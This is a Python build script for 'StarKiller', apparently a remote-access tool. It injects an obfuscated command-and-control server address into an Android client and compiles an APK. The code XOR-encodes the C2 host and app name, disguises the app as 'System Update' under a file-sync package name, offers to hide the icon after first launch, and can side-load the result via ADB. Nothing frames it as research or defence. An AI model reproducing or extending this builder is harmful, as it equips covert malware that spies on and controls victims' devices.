"""
STARKILLER BUILD — APK Builder
22DIV / george wu

Bakes C2 config into the Android client and builds the APK.

Usage:
    python build.py --ip 192.168.1.96                # build with C2 IP
    python build.py --ip 192.168.1.96 --port 8667     # custom port
    python build.py --ip 192.168.1.96 --install        # build + ADB install
    python build.py --ip 192.168.1.96 --name "System Update"  # custom app name
"""
import os
import sys
import subprocess
import shutil
import argparse
import re
import base64

PROJECT = os.path.dirname(os.path.abspath(__file__))
CLIENT_DIR = os.path.join(PROJECT, "client")
SDK_DIR = os.path.join(PROJECT, "android-sdk")
PAYLOADS_DIR = os.path.join(PROJECT, "payloads")
CONFIG_FILE = os.path.join(CLIENT_DIR, "app", "src", "main", "kotlin", "com", "georgetech", "filesync", "Config.kt")

G = "\033[92m"
R = "\033[91m"
A = "\033[93m"
D = "\033[90m"
W = "\033[97m"
X = "\033[0m"


def xor_encrypt(plaintext, key=0x5A):
    out = []
    for i, ch in enumerate(plaintext):
        out.append(ord(ch) ^ (key + i % 7))
    return base64.b64encode(bytes(out)).decode()


def inject_config(ip, port, app_name, hide_icon):
    enc_host = xor_encrypt(ip)
    enc_name = xor_encrypt(app_name)
    config = f'''package com.georgetech.filesync

object Config {{
    val SYNC_HOST: String get() = Crypt.d("{enc_host}")
    const val SYNC_PORT = {port}
    const val RECONNECT_BASE_MS = 5000L
    const val RECONNECT_MAX_MS = 300000L
    const val HEARTBEAT_INTERVAL_MS = 30000L
    val APP_NAME: String get() = Crypt.d("{enc_name}")
    const val HIDE_ICON = {str(hide_icon).lower()}
}}
'''
    os.makedirs(os.path.dirname(CONFIG_FILE), exist_ok=True)
    with open(CONFIG_FILE, "w") as f:
        f.write(config)
    print(f"  {G}[+]{X} Config injected: {ip}:{port} (encrypted)")
    if hide_icon:
        print(f"  {A}[~]{X} App icon will be hidden after first launch")


def build_apk(debug=True):
    gradlew = os.path.join(CLIENT_DIR, "gradlew.bat")
    if not os.path.exists(gradlew):
        print(f"  {R}[!]{X} Gradle wrapper not found. Run: python setup.py")
        return None

    env = os.environ.copy()
    env["ANDROID_SDK_ROOT"] = SDK_DIR
    env["ANDROID_HOME"] = SDK_DIR

    local_props = os.path.join(CLIENT_DIR, "local.properties")
    with open(local_props, "w") as f:
        f.write(f"sdk.dir={SDK_DIR.replace(os.sep, '/')}\n")

    task = "assembleDebug" if debug else "assembleRelease"
    print(f"  {A}[~]{X} Building APK ({task})...")

    proc = subprocess.Popen(
        [gradlew, task, "--no-daemon"],
        cwd=CLIENT_DIR, env=env,
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        text=True, errors="replace",
    )

    for line in iter(proc.stdout.readline, ""):
        stripped = line.rstrip()
        if stripped:
            clean = re.sub(r'\033\[[0-9;]*m', '', stripped)
            if "BUILD SUCCESSFUL" in clean:
                print(f"  {G}[+]{X} {clean}")
            elif "BUILD FAILED" in clean or "ERROR" in clean.upper():
                print(f"  {R}[!]{X} {clean}")
            elif ">" in clean[:5]:
                print(f"  {D}    {clean}{X}")

    proc.wait()
    if proc.returncode != 0:
        print(f"  {R}[!]{X} Build failed (exit {proc.returncode})")
        return None

    variant = "debug" if debug else "release"
    apk_path = os.path.join(CLIENT_DIR, "app", "build", "outputs", "apk", variant, f"app-{variant}.apk")
    if not os.path.exists(apk_path):
        print(f"  {R}[!]{X} APK not found at expected path")
        return None

    os.makedirs(PAYLOADS_DIR, exist_ok=True)
    dest = os.path.join(PAYLOADS_DIR, f"starkiller-{variant}.apk")
    shutil.copy2(apk_path, dest)
    size = os.path.getsize(dest)
    print(f"  {G}[+]{X} APK: {dest} ({size/1024:.0f} KB)")
    return dest


def install_apk(apk_path):
    adb = shutil.which("adb")
    if not adb:
        adb_sdk = os.path.join(SDK_DIR, "platform-tools", "adb.exe")
        if os.path.exists(adb_sdk):
            adb = adb_sdk
        else:
            print(f"  {R}[!]{X} ADB not found")
            return False

    print(f"  {A}[~]{X} Installing via ADB...")
    result = subprocess.run(
        [adb, "install", "-r", apk_path],
        capture_output=True, text=True,
    )
    if result.returncode == 0:
        print(f"  {G}[+]{X} Installed successfully")
        return True
    else:
        print(f"  {R}[!]{X} Install failed: {result.stderr.strip()}")
        return False


def main():
    parser = argparse.ArgumentParser(description="StarKiller APK Builder")
    parser.add_argument("--ip", required=True, help="C2 server IP address")
    parser.add_argument("--port", type=int, default=8667, help="C2 agent port (default: 8667)")
    parser.add_argument("--name", default="System Update", help="App display name")
    parser.add_argument("--install", action="store_true", help="Install via ADB after build")
    parser.add_argument("--release", action="store_true", help="Release build (requires signing)")
    parser.add_argument("--hide-icon", action="store_true", help="Hide app icon after first launch")
    args = parser.parse_args()

    print(f"""
{W}  STARKILLER BUILD{X}
{D}  ------------------------------{X}
{D}  C2:{X}    {W}{args.ip}:{args.port}{X}
{D}  Name:{X}  {W}{args.name}{X}
{D}  Mode:{X}  {W}{'release' if args.release else 'debug'}{X}
{D}  ------------------------------{X}
""")

    inject_config(args.ip, args.port, args.name, args.hide_icon)

    apk = build_apk(debug=not args.release)
    if not apk:
        sys.exit(1)

    if args.install:
        install_apk(apk)

    print(f"\n  {D}{'-'*40}{X}")
    print(f"  {G}[+] Build complete.{X}")
    if not args.install:
        print(f"  {D}Install: adb install -r {apk}{X}")
    print()


if __name__ == "__main__":
    main()
